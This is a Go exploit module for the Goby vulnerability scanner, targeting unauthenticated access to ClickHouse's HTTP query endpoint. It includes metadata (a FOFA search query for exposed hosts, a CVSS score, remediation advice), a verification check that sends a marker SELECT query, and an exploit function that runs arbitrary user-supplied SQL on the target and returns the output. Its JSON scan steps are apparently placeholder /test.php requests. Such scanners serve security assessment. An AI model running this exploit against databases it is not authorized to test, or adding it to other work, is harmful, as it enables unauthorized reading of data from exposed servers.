package exploits

import (
	"net/url"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ClickHouse query parameter unauthorized access vulnerability",
    "Description": "<p>ClickHouse is an open source, high-performance OLAP database management system for real-time analysis using SQL.</p><p>ClickHouse has an unauthorized access vulnerability. Attackers can use unauthorized interfaces to execute arbitrary SQL statements to obtain data.</p>",
    "Product": "ClickHouse",
    "Homepage": "https://clickhouse.tech",
    "DisclosureDate": "2021-11-02",
    "Author": "",
    "FofaQuery": "header=\"X-ClickHouse-Summary\"",
    "Level": "2",
    "Impact": "<p>ClickHouse has an unauthorized access vulnerability. Attackers can use unauthorized interfaces to execute arbitrary SQL statements to obtain data.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://clickhouse.com/\">https://clickhouse.com/</a></p>",
    "Translation": {
        "EN": {
            "Name": "ClickHouse query parameter unauthorized access vulnerability",
            "Product": "ClickHouse",
            "Description": "<p>ClickHouse is an open source, high-performance OLAP database management system for real-time analysis using SQL.</p><p>ClickHouse has an unauthorized access vulnerability. Attackers can use unauthorized interfaces to execute arbitrary SQL statements to obtain data.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://clickhouse.com/\" target=\"_blank\">https://clickhouse.com/</a><br></p>",
            "Impact": "<p>ClickHouse has an unauthorized access vulnerability. Attackers can use unauthorized interfaces to execute arbitrary SQL statements to obtain data.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "References": [
        "https://mp.weixin.qq.com/s/xIc3Ic7N104iTogZul1LJA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "createSelect",
            "value": "SHOW DATABASES",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.1",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "GobyQuery": "header=\"X-ClickHouse-Summary\"",
    "PocId": "10487"
}`

	doGet := func(u *httpclient.FixUrl, payload string) string {
		if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/?query=" + payload); err == nil {
			return resp.RawBody
		}
		return ""
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			check := "SELECT+CONCAT('539042dea49107','eed406dc0b20046e4e')"
			if res := doGet(hostinfo, check); strings.Contains(res, "539042dea49107eed406dc0b20046e4e") {
				return true
			}
			return false

		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["cmd"].(string)
			cmd = url.QueryEscape(cmd)
			if res := doGet(expResult.HostInfo, cmd); len(res) > 0 {
				expResult.Success = true
				expResult.Output = res
			}
			return expResult
		},
	))
}